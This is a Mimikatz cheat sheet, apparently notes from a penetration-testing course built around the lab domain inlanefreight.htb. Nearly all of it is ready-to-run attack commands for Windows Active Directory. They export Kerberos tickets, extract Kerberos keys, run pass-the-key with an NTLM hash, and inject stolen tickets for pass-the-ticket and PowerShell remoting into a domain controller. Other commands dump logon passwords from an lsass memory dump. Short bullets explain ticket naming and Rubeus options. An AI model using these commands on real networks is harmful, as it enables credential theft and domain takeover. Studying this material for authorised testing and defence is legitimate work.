# Mimikatz

### Mimikatz - Export Tickets

```cmd-session
mimikatz.exe
```

```cmd-session
privilege::debug
```

```cmd-session
sekurlsa::tickets /export
```

```cmd-session
exit
```

* The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory.
* User tickets have the user's name,
  * followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.
* We can also export tickets using Rubeus and the option dump
  * This option can be used to dump all tickets (if running as a local administrator).&#x20;
* `Rubeus dump`, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option `/nowrap` for easier copy-paste.

### Mimikatz - Extract Kerberos Keys

```cmd-session
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

### Mimikatz - Pass the Key or OverPass the Hash

```cmd-session
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

### Mimikatz - Pass the Ticket

```cmd-session
mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

### Mimikatz - PowerShell Remoting with Pass the Ticket

```cmd-session
mimikatz.exe
```

```cmd-session
privilege::debug
```

```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

```cmd-session
exit
```

```cmd-session
powershell
```

```cmd-session
Enter-PSSession -ComputerName DC01
```

```cmd-session
[DC01]: PS C:\Users\john\Documents> whoami
```

```cmd-session
[DC01]: PS C:\Users\john\Documents> hostname
```

### Mimikatz - If you already have lsass.dmp

* Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file.
  * This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

```cmd-session
mimikatz.exe
```

```cmd-session
log
```

```cmd-session
sekurlsa::minidump lsass.dmp
```

```cmd-session
sekurlsa::logonpasswords
```
